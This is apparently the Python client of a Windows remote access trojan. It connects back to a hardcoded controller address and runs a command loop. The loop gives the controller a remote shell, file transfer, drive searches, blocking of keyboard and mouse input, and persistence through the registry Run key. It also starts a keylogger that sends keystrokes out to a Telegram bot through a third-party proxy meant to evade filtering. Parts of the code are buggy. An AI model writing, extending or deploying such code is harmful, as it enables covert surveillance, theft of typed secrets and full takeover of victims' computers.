from socket import *
import subprocess
import ctypes
import threading
import requests
import json
import pyautogui
import keyboard
import datetime
#from pynput import keyboard
import winreg
import time
import platform
import psutil
import urllib.request
import os
import colorama
def clear () :
    os.system ('cls')
message_counter = 0           
hostid = '192.168.100.25'
port = '4545'
def Banner () :
    print (colorama.Fore.GREEN + """
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
""")
def timer (t) :
    while t >= 0 :
        mins , secs = divmod (t , 60)
        hrs , mins = divmod (0 , 60)
        timer = '{:02d} : {:02d} : {:02d}'.format(hrs, mins, secs)
        print(timer, end="\r")
        time.sleep (1)
        t -= 1
conn = socket (AF_INET , SOCK_STREAM)
def testconn () :
    try :
        conn.connect ((hostid , int(port)))
        return True
    except :
        return False

class keyb_mouse :
    @staticmethod
    def disable_input () :
        try :
            ctypes.windll.user32.BlockInput(True)
            conn.send ("[+] Input has been disabled (Keyboard and Mouse are blocked)".encode ('utf-8'))
        except :
            conn.send ('[-] Somthing went Wrong! ...'.encode ('utf-8'))
    def enable_input () :
        try :
            ctypes.windll.user32.BlockInput(False)
            conn.send ("[+] Input has been enabled (Keyboard and Mouse are unblocked)".encode ('utf-8'))
        except :
            conn.send ('[-] Something went Wrong! ...'.encode ('utf-8'))





class keylogger :

    def set_bot (token , chatid) :
        drive = psutil.disk_partitions ()
        drive_list = []
        for a in drive :
            drive_list.append (a.device)
            time.sleep (0.1)
        token_path = os.path.join (drive_list[1] , "system_initkn.txt")
        chatid_path = os.path.join (drive_list[1] , "system_iniid.txt")
        with open (token_path , 'a') as file :
            file.write (token)
        with open (chatid_path , 'a') as file2 :
            file2.write (chatid)
        return drive_list[1]

    def bypass_filtering ( token , chatid , inp ) :
            url = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id=-{chatid}&text={inp}')
            dic = {
                "UrlBox": url,
                "AgentList":"Google Chrome",
                "VersionsList":" HTTP/1.1",
                "MethodList":"POST"
            }
            req = requests.post ("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx" , dic)

        




def log_data (inp) :
    if os.path.exists ("D:\\system_initkn.txt") :
        with open ("D:\\system_initkn.txt" , 'r') as token :
            token.read ()
        with open ("D:\\system_iniid.txt" , 'r') as chatid :
            chatid.read ()
        keylogger.bypass_filtering (token , chatid , inp)
    elif os.path.exists ("E:\\system_initkn.txt") :
        with open ("E:\\system_initkn.txt" , 'r') as token :
            token.read ()
        with open ("E:\\system_iniid.txt" , 'r') as chatid :
            chatid.read ()
        keylogger.bypass_filtering (token , chatid , inp)
    elif os.path.exists ("F:\\system_initkn.txt") :
        with open ("F:\\system_initkn.txt" , 'r') as token :
            token.read ()
        with open ("F:\\system_iniid.txt" , 'r') as chatid :
            chatid.read ()
        keylogger.bypass_filtering (token , chatid , inp)
    elif os.path.exists ("G:\\system_initkn.txt") :
        with open ("G:\\system_initkn.txt" , 'r') as token :
            token.read ()
        with open ("G:\\system_iniid.txt" , 'r') as chatid :
            chatid.read ()
        keylogger.bypass_filtering (token , chatid , inp)
    elif os.path.exists ("H:\\system_initkn.txt") :
        with open ("H:\\system_initkn.txt" , 'r') as token :
            token.read ()
        with open ("H:\\system_iniid.txt" , 'r') as chatid :
            chatid.read ()
        keylogger.bypass_filtering (token , chatid , inp)
    







def on_press (key) :
    try :
        if key == keyboard.Key.enter :
            log_data ("<Enter>")
        elif key == keyboard.Key.shift :
            log_data ("<Shift>")
        elif key == keyboard.Key.backspace :
            log_data ("<Backspace>")
        elif key == keyboard.Key.space :
            log_data ("<Space>")
        else :
            log_data (str (key))


    except AttributeError :
        log_data (f"This is unusual key : {str(key)}")


def on_release (key) :
    if key == keyboard.Key.esc :
        return False


def start_keylogger () :        
    with keyboard.Listener (on_press=on_press , on_release=on_release) as listener :
        listener.join ()
    

def check_part (drive) :
                part_list = []
                for a in drive :
                    part_list.append (a.device)
                    conn.send (a.device.encode ("utf-8"))
                    time.sleep (0.1)
                conn.send ('-'.encode ('utf-8'))
                part = conn.recv (1024).decode ('utf-8')
                try:
                    part_index = int(part)
                    if part_index < 0 or part_index >= len(part_list):
                        raise ValueError("Invalid partition index received.")
                    part1 = part_list[part_index]
                    os.chdir(part1)
                    conn.send('+'.encode("utf-8"))
                except (ValueError, IndexError):
                    conn.send('ERROR: Invalid partition selected'.encode('utf-8'))
                

def down(save_path):
    name = conn.recv(123456).decode().strip()  
    file_path = os.path.join(save_path, name)
    with open(file_path, 'wb') as f:
        while True:
            l = conn.recv(1024)
            if not l or l == b'END':  
                return  
            f.write(l)

def upload():
    path = conn.recv(1024).decode()
    try:
        with open(path, 'rb') as f:
            while True:
                l = f.read(1024)
                if not l:
                    control()
                    break
                conn.send(l)
        conn.send(b'END')  
    except FileNotFoundError:
        conn.send(b'ERROR: File not found')




def add_to_startup(program_name: str, program_path: str):
    try:
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, program_name, 0, winreg.REG_SZ, program_path)
        conn.send (f"{program_name} add to statup as sucsessfully !".encode ("utf-8"))
    except Exception as e:
        conn.send (f"Failed add to startup : {e}".encode ("utf-8"))




def change_backg(conn):
    try:
        image_url = conn.recv(1024).decode('utf-8')
        save_name = conn.recv(1024).decode('utf-8')
        urllib.request.urlretrieve(image_url, save_name)
        SPI_SETDESKWALLPAPER = 20
        result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, save_name, 0)
        if result:
            conn.send('Wallpaper Changed :)'.encode('utf-8'))
        else:
            conn.send('Failed to change wallpaper.'.encode('utf-8'))
    except Exception as e:
        conn.send(f'Error: {str(e)}'.encode('utf-8'))



def message (message , message_counter) :
    with open (f'msg{message_counter}.bat' , 'w+') as f :
        f.write (f"""@echo off

msg * {message}

""")
        f.close
        name = (f'msg{message_counter}.bat')
        return name
        
        
        




def control () :
        while True :
            inp = conn.recv (123456).decode()
            if inp == '1' :
                message_counter = 0
                while True :
                
                    data = conn.recv (123456).decode ()
                    if data == 'q' :
                        control ()
                    name = message (data , message_counter)
                    conn.sendall ('[+] Done'.encode ())
                    subprocess.run (name)
                    message_counter += 1
            elif inp == '2' :
                while True :
                    oser = (os.getcwd () + '> ')
                    encoded_oser = oser.encode ()
                    conn.sendall (encoded_oser)
                    data = conn.recv (123456).decode()
                    if data == '-' :
                        continue

                    elif data[0:2] == 'cd' :
                        try :
                            os.chdir (data[3:])
                        except :
                            conn.sendall ('\n[-] NO SUCH DIRECTORY !'.encode ())
                            continue
                    elif data == 'q' :
                        control ()
                    try :
                        cmd = subprocess.getoutput (data)
                        if cmd == None or cmd == "" :
                            conn.sendall ('\n[-] Done !'.encode ())
                            continue
                        conn.sendall (cmd.encode ())
                    except subprocess.CalledProcessError as e :
                        cmd_eror = "\n[-] Command '{}' return with error (code {})"
                        conn.sendall (cmd_eror.encode ())
        
            elif inp == '3' :
                change_backg ()
                continue



            elif inp == '4' :
                inp1 = conn.recv (1024).decode ()
                if inp1 == 'down' :
                    upload ()
                    continue
                elif inp1 == 'up' :
                    path = conn.recv(1024).decode ()
                    down (path)
                    continue





            elif inp == '5' :
                drive = psutil.disk_partitions ()
                check_part (drive)
                while True :
                    file = conn.recv (1024).decode ('utf-8')
                    if not file:
                        conn.send("ERROR: File name cannot be empty.".encode("utf-8"))
                        continue
                    if file == 'q' :
                        control ()
                    result = subprocess.getoutput (f'dir /S /B {file}')
                    conn.send (result.encode ('utf-8'))
                



                
            elif inp == '6' :
                
                command = conn.recv (2048).decode ('utf-8')
                if command == 'LOCK' :
                    keyb_mouse.disable_input ()
                    control ()
                elif command == 'UNLOCK' :
                    keyb_mouse.enable_input ()
                    control ()
                control ()

            elif inp == '7' :
                uname = platform.uname()
                system_info = {
                    "system": uname.system,
                    "node_name": uname.node,
                    "release": uname.release,
                    "version": uname.version,
                    "machine": uname.machine
                }

                json_data = json.dumps(system_info)
                conn.sendall(json_data.encode('utf-8'))
                control ()
            elif inp == '8' :
                program_name = "**myapp**"
                program_path = os.path.abspath("**myapp**.exe")
                add_to_startup(program_name, program_path)
                continue
            elif inp == '9' :
                token = conn.recv (2048).decode ("utf-8")
                chatid = conn.recv (2048).decode ("utf-8")
                keylogger.set_bot (token , chatid)
                keylogger_task = threading.Thread (target=start_keylogger).start ()
                conn.send ("Keylogger seted as sucsessfully!".encode ("utf-8"))
                continue


            else :
                print (colorama.Fore.GREEN +'Retrying to Connecting...')
                timer (10)
                clear ()
                Banner ()
                conncection ()

def conncection () :
    check = testconn ()
    if check == True :
        print (colorama.Fore.CYAN + "\nConnecting to Server...")
        time.sleep (2)
        print (colorama.Fore.GREEN +'\n[+]Connected...')
        time.sleep (3)
        print (colorama.Fore.GREEN + '\n\nAuthenticating...')
        print ('\nThis might take a few moments...')
        control ()        
clear ()
Banner ()
conncection ()



